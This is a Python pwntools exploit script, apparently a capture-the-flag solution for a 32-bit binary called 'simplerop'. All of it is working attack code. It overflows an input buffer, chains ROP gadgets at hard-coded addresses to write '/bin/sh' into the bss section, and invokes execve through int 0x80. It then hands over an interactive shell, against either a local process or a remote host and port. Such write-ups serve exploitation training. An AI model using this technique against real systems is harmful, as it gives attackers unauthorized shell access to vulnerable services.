#!/usr/bin/env python
from pwn import *
import sys
context.log_level="debug"
#context.log_level="info"
code=ELF("./simplerop",checksec=False)
context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch = code.arch
if len(sys.argv)>2:
    con=remote(sys.argv[1],int(sys.argv[2]))
    libc=ELF("./libc.so")
else:
    con=code.process()
    if(context.arch == "amd64"):
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    else:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")


def z(commond=""):
    gdb.attach(con,commond)
def exploit():
    padding = "a"*0x20 #padding
    int80 = 0x080493e1 # int 0x80
    pop_eax = 0x080bae06 # pop eax,ret
    pop_x = 0x0806e850 #pop edx ; pop ecx ; pop ebx ; ret
    mov = 0x0807b301 #mov dword ptr [eax], edx ; ret
    pop_edx = 0x0806e82a #pop edx ; ret
    def write_mem(addr,data):
        s=[pop_eax,addr,pop_edx,data,mov]
        return s
    bss_addr=0x80eaf80
    gadgets = [padding]+write_mem(bss_addr,"/bin")+write_mem(bss_addr+4,"/sh\x00")+[pop_eax,0xb,pop_x,0,0,bss_addr,int80]
    payload = flat(gadgets)
    con.sendlineafter("input :",payload)
exploit()
con.interactive("Shell:")    
